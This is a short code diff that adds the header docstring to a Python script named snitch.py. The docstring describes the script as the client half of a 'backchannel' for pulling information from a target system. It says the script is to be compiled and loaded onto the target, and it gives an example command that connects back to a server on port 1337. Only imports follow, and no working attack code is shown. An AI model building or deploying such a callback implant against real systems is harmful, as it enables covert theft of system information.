@@ -1,3 +1,16 @@
+#!/usr/bin/env python3
+"""
+This modules serves as the client part of our simple backchannel for target system information retrieval
+It should be converted into an executable and loaded onto the target system
+
+File name: snitch.py
+Author: Konstantinos Christos Liosis
+Date created: 13/6/2018
+Python Version: 3.6.0
+
+Example execution:
+$ python snitch.py -server 192.168.1.1 -port 1337
+"""
 import socket
 import argparse
 import os
